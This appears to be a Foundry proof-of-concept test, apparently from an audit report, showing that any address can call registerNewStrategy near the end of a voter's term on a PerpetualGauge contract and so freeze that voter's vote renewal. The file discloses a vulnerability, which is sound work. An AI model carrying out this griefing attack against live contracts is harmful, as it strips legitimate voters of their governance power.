// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/PerpetualGauge.sol";


// This mock simulates the voting token that was originally   `IERC20 public votingToken;`   in the main contract
contract MockVotingToken is IERC20 {
    mapping(address => uint256) public balances;
    string public name = "Mock";
    string public symbol = "MCK";
    uint8 public decimalsVal = 18;

    function totalSupply() external pure override returns (uint256) { return 0; }
    function balanceOf(address account) external view override returns (uint256) { return balances[account]; }
    function allowance(address, address) external pure override returns (uint256) { return 0; }
    function transfer(address, uint256) external pure override returns (bool) { revert(); }
    function approve(address, uint256) external pure override returns (bool) { revert(); }
    function transferFrom(address, address, uint256) external pure override returns (bool) { revert(); }

    function mint(address who, uint256 amount) external {
        balances[who] = balances[who] + amount;
    }
}


// This mock simulates the `IStrategyClassifier` contract to satisfy the constructor
contract MockStratClassifier is IStrategyClassifier {
    function getStrategyRiskLevel(uint256) external pure override returns (uint8) { return 0; }
    function getIndividualCap(uint256) external pure override returns (uint256) { return 10000; } // 100%
    function getGlobalCap(uint8) external pure override returns (uint256) { return 10000; } // 100%
}


// This mock simulates the `IAllocatorProxy` contract to satisfy the constructor
contract MockAllocatorProxy is IAllocatorProxy {
    event AllocCalled(uint256 strategyId, uint256 amount);
    function allocate(uint256 strategyId, uint256 amount) external override {
        emit AllocCalled(strategyId, amount);
    }
}


//TEST contract 
contract PerpetualGauge_RegisterNewStrategy_PoC is Test {
    PerpetualGauge gauge;
    MockVotingToken token;
    MockStratClassifier classifier;
    MockAllocatorProxy allocator;

  
    address good_user = address(0x1001); // User who will cast a vote
    address bad_user  = address(0x1002); // User who will attempt to freeze the vote

    uint256 constant YieldTokenID = 1;   // ID of a specific token or yield pool
    uint256 constant STID = 10;          // ID of a specific strategy to be registered or allocated in the test



    function setUp() public {
        // deploy mocks
        token = new MockVotingToken();
        classifier = new MockStratClassifier();
        allocator = new MockAllocatorProxy();

        // deploy PerpetualGauge with mock addresses
        gauge = new PerpetualGauge(address(classifier), address(allocator), address(token));

        // give good_user  some voting power
        token.mint(good_user, 1e18); // 1 token (with 18 decimals)
    }




    /// @notice Go to the main contract at /src/PerpetualGauge.sol  in lines 60, 61, 62, 63
    /// @notice This `revert()` was added only to indicate that the vote renewal is frozen
    /// @notice📌 The reason for adding this is that no message was shown inside to indicate the failure to renew; otherwise, this revert has no effect on the function's behavior 

    ///@dev follow comments 👇🏽
    
    ///    forge test -vvvv

    function test_freeze_vote_by_registerNewStrategy() public {
            // Prepare vote input
            uint256[] memory sids=new uint256[](1);
            sids[0] = STID; // ID
            uint256[] memory wts=new uint256[](1);
            wts[0] = 100; // weight

        // There must be a strategy that the user can vote for
        gauge.registerNewStrategy(YieldTokenID, 999);

        //  good_user casts a vote
        vm.prank(good_user); // good user
        gauge.vote(YieldTokenID, sids, wts);
        // 365 days of user vote validity has started


        // Now 25 days remain for the good_user to extend their vote
        vm.warp(block.timestamp + 340 days);


        // But bad_user updates the strategy again, making all conditions of this line true  --------> if (lastAdded > 0 && block.timestamp - lastAdded < MIN_RESET_DURATION && timeLeft < MIN_RESET_DURATION)
        // so that good_user cannot extend their vote 
        vm.prank(bad_user);
        gauge.registerNewStrategy(YieldTokenID, 999);
        

        // Now good_user tries to extend their vote, but it fails because this condition is also true ----------> block.timestamp - lastAdded < MIN_RESET_DURATION

        vm.expectRevert(bytes("You cannot extend your vote due to the strategy being updated."));
        vm.prank(good_user);
        gauge.vote(YieldTokenID, sids, wts);
        


    }


}
